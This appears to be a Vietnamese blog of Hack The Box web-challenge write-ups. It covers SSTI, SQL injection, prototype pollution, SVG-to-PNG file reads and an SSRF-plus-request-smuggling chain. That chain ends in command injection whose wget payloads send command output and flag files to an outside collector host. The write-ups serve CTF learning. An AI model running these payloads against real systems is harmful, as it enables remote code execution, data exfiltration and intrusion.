---
title: "Htb web chall ctf 2024 - solved challenges - part 4"
excerpt: "August 21, 2023 08:00 AM ICT to August 21, 2023 04:00 PM ICT"
header:
show_date: true
header:
  teaser: "../assets/images/images-icon/htb.jpg"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

<p align="center">
<img src="https://l3mnt2010.github.io/assets/images/images-icon/htb.jpg">
</p>

# Hack the box (part4) - Medium


## Under Construction

```
GET / HTTP/1.1
Host: 94.237.49.212:43743
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://burpsuite/
Connection: close
Cookie: PHPSESSID=eyJ1c2VybmFtZSI6ImhpaGlAZ21haWwuY29tIn0%3D; session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICIndW5pb24gc2VsZWN0IG51bGwsdG9wX3NlY3JldF9mbGFhZyxudWxsIGZyb20gZmxhZ19zdG9yYWdlLS0iLCAicGsiOiAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiIsICJpYXQiOiAxNzI2ODAxNTQ2fQ.GMnFlwfpkGpgap8Wj4pdWhj67MzSyYc4goQvVb6npBc
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```
![image](https://hackmd.io/_uploads/ByFI-OqaC.png)


flag: `HTB{d0n7_3xp053_y0ur_publ1ck3y}`


## breaking grad


```
POST /api/calculate HTTP/1.1
Host: 83.136.249.80:30878
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://83.136.249.80:30878/
Content-Type: application/json
Content-Length: 113
Origin: http://83.136.249.80:30878
Connection: close
Priority: u=0

{"name":"hi","constructor":{
"prototype":{
"execPath":   "/bin/cat",
"execArgv": [
"./flag_e1T6f"
]
}
}
}
```

![image](https://hackmd.io/_uploads/SJu3O_5TC.png)


![image](https://hackmd.io/_uploads/SJ56Odq6A.png)


flag: `HTB{l00s1ng_t3nur3_l1k3_it5_fr1d4y_m0rn1ng}`

## wafwaf

`' union select case when (SUBSTRING(flag,{i},1)='{char}') then sleep(10) else sleep(0) end from definitely_not_a_flag-- -`


```
POST / HTTP/1.1
Host: 83.136.249.80:53993
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Contype-type: application/json
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Length: 122

{
"user": "\u0027\u0020\u0075\u006E\u0069\u006F\u006E\u0020\u0073\u0065\u006C\u0065\u0063\u0074\u0020\u0063\u0061\u0073\u0065\u0020\u0077\u0068\u0065\u006E\u0020\u0028\u0053\u0055\u0042\u0053\u0054\u0052\u0049\u004E\u0047\u0028\u0066\u006C\u0061\u0067\u002C\u007B\u0069\u007D\u002C\u0031\u0029\u003D\u0027\u007B\u0063\u0068\u0061\u0072\u007D\u0027\u0029\u0020\u0074\u0068\u0065\u006E\u0020\u0073\u006C\u0065\u0065\u0070\u0028\u0031\u0030\u0029\u0020\u0065\u006C\u0073\u0065\u0020\u0073\u006C\u0065\u0065\u0070\u0028\u0030\u0029\u0020\u0065\u006E\u0064\u0020\u0066\u0072\u006F\u006D\u0020\u0064\u0065\u0066\u0069\u006E\u0069\u0074\u0065\u006C\u0079\u005F\u006E\u006F\u0074\u005F\u0061\u005F\u0066\u006C\u0061\u0067\u002D\u002D\u0020\u002D"}
```


## baby ninja ninja


`{% if session.update({request.args.key:self._TemplateReference__context.cycler.__init__.__globals__.os.popen(request.args.command).read()}) == 1 %}{% endif %}&key=leader&command=id`


flag: ``



## Mutation Lab

![image](https://hackmd.io/_uploads/SJD5GNYRC.png)


Như ta có thể thấy là ở đây đang sử dụng `convert-svg-core` để convert svg sang png `Directory Traversal CVE-2021-23631`.

-> bây giờ thì đấm thôi:

```
POST /api/export HTTP/1.1
Host: 94.237.51.124:38432
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://94.237.51.124:38432/dashboard
Content-Type: application/json
Content-Length: 275
Origin: http://94.237.51.124:38432
Connection: close
Cookie: session=eyJ1c2VybmFtZSI6ImwzbW50MjAxMCJ9; session.sig=PAXdZgGIPZMJ9aFWrfQvX3cxesk
Priority: u=0

{"svg":"<svg-dummy></svg-dummy><iframe src=\"file:///etc/passwd\" width=\"100%\" height=\"1000px\"></iframe><svg viewBox=\"0 0 240 80\" height=\"1000\" width=\"1000\" xmlns=\"http://www.w3.org/2000/svg\"><text x=\"0\" y=\"0\" class=\"Rrrrr\" id=\"demo\">data</text></svg>"
}
```

![image](https://hackmd.io/_uploads/rytSEEY0R.png)

![image](https://hackmd.io/_uploads/ByZPEVFCA.png)


![image](https://hackmd.io/_uploads/ryxCVEKR0.png)

Thử flag.txt và flag nhưng không thấy có flag nên ta đọc file của chall để xem vị trí của nó.

![image](https://hackmd.io/_uploads/HkVtBEKRR.png)

![image](https://hackmd.io/_uploads/ryFuB4KA0.png)

Đọc file `/app/routes/index.js`:

![image](https://hackmd.io/_uploads/rJJGUVYAC.png)


có thể thấy nếu session.username của chúng ta là admin thì sẽ nhận được flag.

-> và chương trình sử dụng session ở đây:

![image](https://hackmd.io/_uploads/rJbChEFCC.png)


secret-key nằm tại `/app/.env`:

![image](https://hackmd.io/_uploads/r1yb64KR0.png)

![image](https://hackmd.io/_uploads/ryDCzBYRR.png)

poc: 

```
const express        = require('express');
const session        = require('cookie-session');
const app            = express();
const path           = require('path');
const cookieParser   = require('cookie-parser');
const nunjucks       = require('nunjucks');
app.use(express.json({ limit: '2mb' }));
app.use(cookieParser('fc8c7ef845baff7935591112465173e7'));
app.use(session({
    name: 'session',
    keys: ['fc8c7ef845baff7935591112465173e7']
}));

nunjucks.configure('views', {
    autoescape: true,
    express: app
});

app.get('/set-session', (req, res) => {
    req.session.username = 'admin';
    res.send('Session has been set with username = admin');
});

// Route để trả về session username
app.get('/', (req, res) => {
    if (req.session.username) {
        res.send({
            message: `Hello, ${req.session.username} ${req.session}`
        });
    } else {
        res.status(404).send({
            message: '404 page not found'
        });
    }
});

(async () => {
    app.listen(1337, '0.0.0.0', () => console.log('Listening on port 1337'));
})();
```

![image](https://hackmd.io/_uploads/Bym-XBFRA.png)

ta truy cập và nhận session admin ->

![image](https://hackmd.io/_uploads/BkoGXrKCA.png)

dùng session này truy cập ở trên và nhận flag

flag: `HTB{fr4m3d_s3cr37s_4nd_f0rg3d_entr13s}`

## HTB Proxy

một chall white box với golang proxy recustom và backend chạy `express js`

Đầu tiên ta sẽ xác định sink và source của chall -> có thể thấy proxy chặn trước backend -> khả năng cao thì sink sẽ nằm ở backend này:

reconnaissance:

### backend [nodejs]

```
const ipWrapper = require("ip-wrapper");
const express = require("express");

const app = express();
app.use(express.json());

const validateInput = (req, res, next) => {
    const { interface } = req.body;

    if (
        !interface || 
        typeof interface !== "string" || 
        interface.trim() === "" || 
        interface.includes(" ")
    ) {
        return res.status(400).json({message: "A valid interface is required"});
    }

    next();
}

app.post("/getAddresses", async (req, res) => {
    try {
        const addr = await ipWrapper.addr.show();
        res.json(addr);
    } catch (err) {
        res.status(401).json({message: "Error getting addresses"});
    }
});

app.post("/flushInterface", validateInput, async (req, res) => {
    const { interface } = req.body;

    try {
        const addr = await ipWrapper.addr.flush(interface);
        res.json(addr);
    } catch (err) {
        res.status(401).json({message: "Error flushing interface"});
    }
});

app.listen(5000, () => {
    console.log("Network utils API is up on :5000");
});
```

cơ bản thì source code chỉ đơn giản như sau ngoài expressjs còn sử dụng một module khác đó là `ip-wrapper` có 2 api duy nhất đó là `getAddresses` sẽ trả về giá trị `const addr = await ipWrapper.addr.show();` dưới dạng json
còn api còn lại là `flushInterface` ở đây sẽ chạy qua một middleware đó là `validateInput` hàm này sẽ thực hiện:

```
const validateInput = (req, res, next) => {
    const { interface } = req.body;

    if (
        !interface || 
        typeof interface !== "string" || 
        interface.trim() === "" || 
        interface.includes(" ")
    ) {
        return res.status(400).json({message: "A valid interface is required"});
    }

    next();
}
```
nó sẽ nhận giá trị interface sau đó kiểm tra xem có `!interface || 
        typeof interface !== "string" || 
        interface.trim() === "" || 
        interface.includes(" ")`
        
Nếu interface dính phải 1 trong các điều kiện này sẽ trả ra lỗi 400 bad request ngược lại thì có thể access đến endpoint của api trên.


quay trở lại với api nãy:

```
 const addr = await ipWrapper.addr.flush(interface);
        res.json(addr);
```

khả năng cao là đây là sink của vul vì tại đây trông có vẻ là nơi duy nhất ta có thể control được đầu vào.

![image](https://hackmd.io/_uploads/SyXZKrYCC.png)


Đúng như dự đoán thì `ip address flush dev ${interfaceName}` tại đây cộng chuỗi trực tiếp nên bị dính command injection -> ta sẽ bám vào đây.

Câu hỏi nan giải ở đây là bypass được middleware -> nhưng mà trông có vẻ khá đơn giản:

interface chỉ cần là string và không chứa space ở trong interface -> ở đây chỉ cần dùng ``${IFS}`` để bypass này là được.

Vậy là phần sink đã xử lí xong -> ta sẽ đi tìm phần source và các gadget có thể dẫn đến nó

vị trí flag nằm ở root:

![image](https://hackmd.io/_uploads/r1DRkLtRA.png)

### proxy [golang]

Đây là giao diện khởi đầu của proxy:

![image](https://hackmd.io/_uploads/HkIBxUtRR.png)

được recustom http với golang -> ta có thể quan sát nó custom lại:

```
type HTTPRequest struct {
	RemoteAddr string
	Method     string
	URL        string
	Protocol   string
	Headers    map[string]string
	Body       string
}

type HTTPResponse struct {
	Protocol      string
	StatusCode    int
	StatusMessage string
	Headers       map[string]string
	Body          string
}

type HTTPStatusCodesStruct struct {
	Continue             int
	SwitchingProtocols   int
	OK                   int
	Created              int
	Accepted             int
	NonAuthoritativeInfo int
	NoContent            int
	ResetContent         int
	PartialContent       int
	MultipleChoices      int
	MovedPermanently     int
	Found                int
	BadRequest           int
	Unauthorized         int
	PaymentRequired      int
	Forbidden            int
	NotFound             int
	InternalServerError  int
	NotImplemented       int
	BadGateway           int
	ServiceUnavailable   int
}

var HTTPStatusCodes = HTTPStatusCodesStruct{
	Continue:             100,
	SwitchingProtocols:   101,
	OK:                   200,
	Created:              201,
	Accepted:             202,
	NonAuthoritativeInfo: 203,
	NoContent:            204,
	ResetContent:         205,
	PartialContent:       206,
	MultipleChoices:      300,
	MovedPermanently:     301,
	Found:                302,
	BadRequest:           400,
	Unauthorized:         401,
	PaymentRequired:      402,
	Forbidden:            403,
	NotFound:             404,
	InternalServerError:  500,
	NotImplemented:       501,
	BadGateway:           502,
	ServiceUnavailable:   503,
}

type HTTPMethodsStruct struct {
	GET     string
	POST    string
	PUT     string
	DELETE  string
	PATCH   string
	HEAD    string
	OPTIONS string
}

var HTTPMethods = HTTPMethodsStruct{
	GET:     "GET",
	POST:    "POST",
	PUT:     "PUT",
	DELETE:  "DELETE",
	PATCH:   "PATCH",
	HEAD:    "HEAD",
	OPTIONS: "OPTIONS",
}

type HTTPVersionsStruct struct {
	HTTP1_0 string
	HTTP1_1 string
	HTTP2   string
	HTTP3   string
}

var HTTPVersions = HTTPVersionsStruct{
	HTTP1_0: "HTTP/1.0",
	HTTP1_1: "HTTP/1.1",
	HTTP2:   "HTTP/2",
	HTTP3:   "HTTP/3",
}

type ContentTypesStruct struct {
	TextHTML          string
	ApplicationJSON   string
	ApplicationXML    string
	TextPlain         string
	ImagePNG          string
	ImageJPEG         string
	MultipartFormData string
}

var ContentTypes = ContentTypesStruct{
	TextHTML:          "text/html",
	ApplicationJSON:   "application/json",
	ApplicationXML:    "application/xml",
	TextPlain:         "text/plain",
	ImagePNG:          "image/png",
	ImageJPEG:         "image/jpeg",
	MultipartFormData: "multipart/form-data",
}

```

Custom lại tất cả bằng các struct gần như đầy đủ các thành phần của một http header.

backend chạy local ở port 1337:


```
func main() {
	var serverPort string = "1337"
	var version string = "1.0.0"
	logHeader(version)

	ln, err := net.Listen("tcp", ":"+serverPort)
	if err != nil {
		prettyLog(2, "Error listening: "+err.Error())
		return
	}

	defer ln.Close()
	prettyLog(1, "HTB proxy listening on :"+serverPort)

	for {
		conn, err := ln.Accept()
		if err != nil {
			prettyLog(2, "Error accepting: "+err.Error())
			continue
		}

		go handleRequest(conn)
	}
}
```

Logic chính của proxy -> khi nhận request từ client sau đó sẽ gửi dữ liệu bằng giao thức tcp:

đầu tiên gọi `logHeader` với arg là version 1.0.0:

![image](https://hackmd.io/_uploads/H1SaWLYRC.png)

chỉ việc in ra nội dung không có gì đặc biệt:

tiếp theo gọi hàm `func prettyLog(logType int, content string) {
	var logger *log.Logger = log.New(os.Stdout, "", log.LstdFlags)
	switch logType {
	case 1:
		logger.Printf("[+] %s", content)
	case 2:
		logger.Printf("[-] %s", content)
	default:
		logger.Printf("[#] %s", content)
	}
}` với tham số `prettyLog(2, "Error listening: "+err.Error())`

ở đây chỉ logger ra nội dung không có gì.


-> tiếp theo duyệt một vòng for cho đến khi không error thì gọi `handleRequest(conn)`

```
func handleRequest(frontendConn net.Conn) {
	buffer := make([]byte, 1024)

	length, err := frontendConn.Read(buffer)
	var remoteAddr string = frontendConn.RemoteAddr().String()

	prettyLog(1, "Connection from: "+remoteAddr)

	if err != nil {
		prettyLog(2, "Error reading: "+err.Error())
		frontendConn.Close()
		return
	}

	var requestBytes = buffer[:length]
	request, err := requestParser(requestBytes, remoteAddr)

	if err != nil {
		var responseText string = badReqResponse(err.Error())
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	if request.Protocol != HTTPVersions.HTTP1_1 {
		var responseText string = notSupportedResponse("Protocol version not supported")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	if request.URL == string([]byte{47}) {
		var responseText string = htmlResponse("/app/proxy/includes/index.html")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	if request.URL == string([]byte{47, 115, 101, 114, 118, 101, 114, 45, 115, 116, 97, 116, 117, 115}) {
		var serverInfo string = GetServerInfo()
		var responseText string = okResponse(serverInfo)
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	if strings.Contains(strings.ToLower(request.URL), string([]byte{102, 108, 117, 115, 104, 105, 110, 116, 101, 114, 102, 97, 99, 101})) {
		var responseText string = badReqResponse("Not Allowed")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	host, hostExists := request.Headers["Host"]
	if !hostExists {
		var responseText string = badReqResponse("Host header not set")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	var hostArray []string = strings.Split(host, ":")
	if len(hostArray) != 2 || hostArray[1] == "" {
		var responseText string = badReqResponse("Invalid host")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	var hostPort string = hostArray[1]
	inRange, err := isDigitInRange(hostPort, 1, 65535)
	if err != nil || !inRange {
		var responseText string = badReqResponse("Invalid port")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	var hostAddress string = hostArray[0]
	var isIPv4Addr bool = isIPv4(hostAddress)
	var isDomainAddr bool = isDomain(hostAddress)

	if !isIPv4Addr && !isDomainAddr {
		var responseText string = badReqResponse("Invalid host")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	isLocal, err := checkIfLocalhost(hostAddress)
	if err != nil {
		var responseText string = errorResponse("Invalid host")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	if isLocal {
		var responseText string = movedPermResponse("/")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	isMalicious, err := checkMaliciousBody(request.Body)
	if err != nil || isMalicious {
		var responseText string = badReqResponse("Malicious request detected")
		prettyLog(1, "Malicious request detected")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	backendConn, err := net.Dial("tcp", host)
	if err != nil {
		var responseText string = errorResponse("Could not connect to backend server")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		return
	}

	_, err = backendConn.Write(requestBytes)
	if err != nil {
		var responseText string = errorResponse("Error sending request to backend")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		backendConn.Close()
		return
	}

	var backendResponse strings.Builder
	var scanner *bufio.Scanner = bufio.NewScanner(backendConn)

	for scanner.Scan() {
		var line string = scanner.Text()
		backendResponse.WriteString(line + "\n")
	}

	if err := scanner.Err(); err != nil {
		var responseText string = errorResponse("Error reading backend response")
		frontendConn.Write([]byte(responseText))
		frontendConn.Close()
		backendConn.Close()
		return
	}

	prettyLog(1, "Forwarding request to: "+host)
	var responseStr string = backendResponse.String()
	frontendConn.Write([]byte(responseStr))
	frontendConn.Close()
	backendConn.Close()
}
```

chương trình sẽ thực hiện phân tích dữ liệu từ frontend -> độ dài content + remoteAddr -> sau đó gọi `request, err := requestParser(requestBytes, remoteAddr)` với 2 tham số này:


```
func requestParser(requestBytes []byte, remoteAddr string) (*HTTPRequest, error) {
	var requestLines []string = strings.Split(string(requestBytes), "\r\n")
	var bodySplit []string = strings.Split(string(requestBytes), "\r\n\r\n")

	if len(requestLines) < 1 {
		return nil, fmt.Errorf("invalid request format")
	}

	var requestLine []string = strings.Fields(requestLines[0])
	if len(requestLine) != 3 {
		return nil, fmt.Errorf("invalid request line")
	}

	var request *HTTPRequest = &HTTPRequest{
		RemoteAddr: remoteAddr,
		Method:     requestLine[0],
		URL:        requestLine[1],
		Protocol:   requestLine[2],
		Headers:    make(map[string]string),
	}

	for _, line := range requestLines[1:] {
		if line == "" {
			break
		}

		headerParts := strings.SplitN(line, ": ", 2)
		if len(headerParts) != 2 {
			continue
		}

		request.Headers[headerParts[0]] = headerParts[1]
	}

	if request.Method == HTTPMethods.POST {
		contentLength, contentLengthExists := request.Headers["Content-Length"]
		if !contentLengthExists {
			return nil, fmt.Errorf("unknown content length for body")
		}

		contentLengthInt, err := strconv.Atoi(contentLength)
		if err != nil {
			return nil, fmt.Errorf("invalid content length")
		}

		if len(bodySplit) <= 1 {
			return nil, fmt.Errorf("invalid content length")
		}

		var bodyContent string = bodySplit[1]
		if len(bodyContent) != contentLengthInt {
			return nil, fmt.Errorf("invalid content length")
		}

		request.Body = bodyContent[0:contentLengthInt]
		return request, nil
	}

	if len(bodySplit) > 1 && bodySplit[1] != "" {
		return nil, fmt.Errorf("can't include body for non-POST requests")
	}

	return request, nil
}
```

Đầu tiên sẽ cắt từng dòng của request `var requestLines []string = strings.Split(string(requestBytes), "\r\n")
` và gán vào mảng.

sau đó sẽ tạo mảng 2 phần tử chia các 2 phần là body và header -> gắn vào mảng.

yêu cầu header phải có >=1 dòng -> sau đó thực hiện phân tích hàng đầu tiên

ví dụ dòng đầu tiên thì thường có `GET /success.txt?ipv4 HTTP/1.1` nó sẽ tách thành mảng có 3 phần tử -> và nếu khác 3 thì trả ra lỗi.

Tiếp tục khởi tạo các header:

```
var request *HTTPRequest = &HTTPRequest{
		RemoteAddr: remoteAddr,
		Method:     requestLine[0],
		URL:        requestLine[1],
		Protocol:   requestLine[2],
		Headers:    make(map[string]string),
	}
```

sau đó:

```
for _, line := range requestLines[1:] {
		if line == "" {
			break
		}

		headerParts := strings.SplitN(line, ": ", 2)
		if len(headerParts) != 2 {
			continue
		}

		request.Headers[headerParts[0]] = headerParts[1]
	}
```

duyệt qua từng dòng của header sau đó split theo dấu `:` và yêu cầu header phải có đầy đủ thông tin của từng dòng  -> tiếp sau đó sẽ lấy method check xem có phải POST hay không -> yêu cầu phải có header content-length -> có body content -> sau đó trả ra request.

Quay trở lại với hàm `handleRequest` biến request được gán giá trị trả ra ở trên nếu không lỗi + kiểm tra là HTTP1_1

nếu url là ``/`` thì trả ra trang index.html như ta thấy ở ảnh đầu.

nếu url là `string([]byte{47, 115, 101, 114, 118, 101, 114, 45, 115, 116, 97, 116, 117, 115})` `"/server-status"` thì nhận được giá trị serverInfo `info := fmt.Sprintf("Hostname: %s, Operating System: %s, Architecture: %s, CPU Count: %d, Go Version: %s, IPs: %s",
		hostname, runtime.GOOS, runtime.GOARCH, runtime.NumCPU(), runtime.Version(), ipList)`
        
url chứa chuỗi `"flushinterface"` thì sẽ bị not allow ở đây có thể thấy là nó ngăn chặn ta truy cập đến api kia của backend dính cmdi.

Lấy header Host và xác định port nằm trong khoảng 1 đến 65535:

Kiểm tra có phải ipV4 không trong đó sẽ kiểm tra nếu ip của chưa 0x thì không cho phép và phải match với regex ipv4 và thỏa mãn blacklist:

```
func blacklistCheck(input string) bool {
	var match bool = strings.Contains(input, string([]byte{108, 111, 99, 97, 108, 104, 111, 115, 116})) ||
		strings.Contains(input, string([]byte{48, 46, 48, 46, 48, 46, 48})) ||
		strings.Contains(input, string([]byte{49, 50, 55, 46})) ||
		strings.Contains(input, string([]byte{49, 55, 50, 46})) ||
		strings.Contains(input, string([]byte{49, 57, 50, 46})) ||
		strings.Contains(input, string([]byte{49, 48, 46}))

	return match
}
```

```
const (
    localhost     = "localhost"
    ip0000        = "0.0.0.0"
    ip127         = "127."
    ip172         = "172."
    ip192         = "192."
    ip10          = "10."
)
```

không chấp nhận các ip nằm trong loopback

tiếp theo check isDomainAddr match regex domain và không nằm trong blacklist trên.

check isLocal lookupip trả ra mảng các ip sau đó duyệt vòng for nếu ip là loopback thì trả ra true ngược lại false

nếu là iploopback trong mảng thì redirect `/`

check nếu trong body chứa

```
func checkMaliciousBody(body string) (bool, error) {
	patterns := []string{
		"[`;&|]",
		`\$\([^)]+\)`,
		`(?i)(union)(.*)(select)`,
		`<script.*?>.*?</script>`,
		`\r\n|\r|\n`,
		`<!DOCTYPE.*?\[.*?<!ENTITY.*?>.*?>`,
	}

	for _, pattern := range patterns {
		match, _ := regexp.MatchString(pattern, body)
		if match {
			return true, nil
		}
	}
	return false, nil
}
```

thì cấm

nếu vượt qua tất cả các điều kiện thì có tể access đến backend nodejs.

bây giờ thì ta sẽ access đến các url mà trả về các thông tin trước:

`/server-status`

![image](https://hackmd.io/_uploads/r1JeVsFRR.png)

Từ thông tin trên ta có thể biết được hostname của máy chủ là `ng-1423060-webhtbproxybiz2024-ajpmz-84bf99668d-phjm7`, Operating System là trên hệ điều hành linux công nghệ amd64, golang version `Go Version: go1.21.10`, địa chỉ `IPs: 192.168.199.247` là địa chỉ `Địa chỉ IP nội bộ của máy chủ hoặc container trong mạng cục bộ (LAN)`.

Như mô hình mạng như trên ta thấy khá quen thuộc với các cuộc tấn công SSRF vào trong mạng nội bộ rồi -> vậy ta có thể tận dụng ip của container này để bypass được black-list ở trên check ip loopback. Mất một thời gian tìm hiểu thì biết được ngoài việc trigger SSRF thông thường ta còn có thể sử dụng một kỹ thuật đó là DNS Binding thông qua việc sử dụng nip.io.

Nip.io là một dịch vụ DNS tự động chuyển đổi địa chỉ IP thành tên miền phụ dựa trên định dạng nhất định. Ví dụ, nếu địa chỉ IP của máy chủ là 192.0.2.1, ta có thể truy cập vào máy chủ đó bằng cách sử dụng tên miền phụ "192.0.2.1.nip.io".

https://nip.io/

Bình thường nếu ta truyền vào các địa chỉ iploopback thì sẽ không thể vượt qua blacklist trên vì nó check 127. nhưng trường hợp ta đã biết ip của container thì hoàn toàn có thể.

![image](https://hackmd.io/_uploads/S1f1DjYCC.png)

kiểm tra với một endpoint không tồn tại sẽ không nhận được kết quả trả về vì gửi đến backend nhưng không có gì.

![image](https://hackmd.io/_uploads/r1AQwoKAC.png)

dùng localhost 127. vì dính ip loopback nên nhận invalid host.

Nhớ backend cần thêm port 5000
thêm nữa là blacklist như này:

![image](https://hackmd.io/_uploads/Hyw2vsF0A.png)

nếu ta dùng dot ở đây thì 192. vẫn sẽ bị chặn

![image](https://hackmd.io/_uploads/HJLAPoFC0.png)

do đó sẽ dùng `dash notation: magic-127-0-0-1.nip.io`

payload: 

```
GET /serve HTTP/1.1
Host: magic-192-168-199-247.nip.io:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

có thể thấy request đã được gửi trực tiếp đến backend.

việc tiếp theo:

![image](https://hackmd.io/_uploads/S1VZ4nFCR.png)

ở đây ta lại không thể truy cập đến `flushInterface` do proxy check chứa chuỗi này thì sẽ trả ra not allowed.

Tại đây, golang phân tích phần thân bằng cách chỉ cần tách request thành một mảng nơi có ký tự ``\r\n\r\n``. Đối với một yêu cầu HTTP thông thường, điều này là hợp lý vì phần thân thường nằm sau ``\r\n\r\n``. Tuy nhiên, ta có thể thấy một điều kì lạ là nếu ta tiếp sử dụng ``\r\n\r\n`` để gửi request thứ hai (smuggling) và bằng cách cố định việc truyền Content-Length: 1 và phần body với length tương đương, lúc này request parser sẽ coi phần thân lúc này chỉ là byte đầu với length là 1, điều này có nghĩa là khi checkMaliciousBody kiểm tra nó sẽ chỉ xem xét duy nhất byte này mà không tiến hành check requests thứ hai.

![image](https://hackmd.io/_uploads/H13G1aYAA.png)

request smuggling thành công

![image](https://hackmd.io/_uploads/rJK1VaKRA.png)

thực hiện command injection vào đây -> nhận được request đến:

![image](https://hackmd.io/_uploads/HkhWETYC0.png)

```
POST /serve HTTP/1.1
Host: magic-192-168-42-238.nip.io:5000
Content-Type: application/x-www-form-urlencoded
Content-Length: 1

a

POST /flushInterface HTTP/1.1
Host: localhost:5000
Content-Length: 103
Content-Type: application/json

{"interface":";wget${IFS}--post-data${IFS}\"$(echo${IFS}RCE)\"${IFS}-O-${IFS}dvk7k4ar.requestrepo.com"}

```

![image](https://hackmd.io/_uploads/By__N6KAR.png)


![image](https://hackmd.io/_uploads/ByNt46KC0.png)

```
POST /serve HTTP/1.1
Host: magic-192-168-42-238.nip.io:5000
Content-Type: application/x-www-form-urlencoded
Content-Length: 1

a

POST /flushInterface HTTP/1.1
Host: localhost:5000
Content-Length: 105
Content-Type: application/json

{"interface":";wget${IFS}--post-data${IFS}\"$(cat${IFS}/*.txt)\"${IFS}-O-${IFS}dvk7k4ar.requestrepo.com"}
```

![image](https://hackmd.io/_uploads/HJneHTtAR.png)

![image](https://hackmd.io/_uploads/HJhQH6tAC.png)

flag: `HTB{re3nv3nt1ng_th3_wh33l_suck5}`


## SerialFlow

bài cho source code python chỉ đơn giản như sau:

```
import pylibmc, uuid, sys
from flask import Flask, session, request, redirect, render_template
from flask_session import Session

app = Flask(__name__)

app.secret_key = uuid.uuid4()

app.config["SESSION_TYPE"] = "memcached"
app.config["SESSION_MEMCACHED"] = pylibmc.Client(["127.0.0.1:11211"])
app.config.from_object(__name__)

Session(app)

@app.before_request
def before_request():
    if session.get("session") and len(session["session"]) > 86:
        session["session"] = session["session"][:86]


@app.errorhandler(Exception)
def handle_error(error):
    message = error.description if hasattr(error, "description") else [str(x) for x in error.args]

    response = {
        "error": {
            "type": error.__class__.__name__,
            "message": message
        }
    }

    return response, error.code if hasattr(error, "code") else 500


@app.route("/set")
def set():
    uicolor = request.args.get("uicolor")

    if uicolor:
        session["uicolor"] = uicolor
    
    return redirect("/")


@app.route("/")
def main():
    uicolor = session.get("uicolor", "#f1f1f1")
    return render_template("index.html", uicolor=uicolor)
```

server chạy với flask -> ở đây ta để ý có sử dụng memcache để lưu trữ giá trị của session với module pylibmc với server memcache chạy tại localhost:11211

chương trình có một middleware luôn check session của người dùng:

ở đây chỉ có 2 api đó là ``/`` và `/set` 

khi truy cập vào ``/set`` thì server nhận `uicolor` -> sau đó set session và redirect đến ``/`` -> sau đó get session `uicolor` và hiển thị template với màu đã được set.

Cơ bản thì ta không thấy có bug gì ở đây:

Sau khi searching ta có thể thấy: https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/

- Mình làm bài Leader board ở giải braekerCTF thì thấy khá giống nhau mỗi tội bài kia phải brute-force app secret key. 
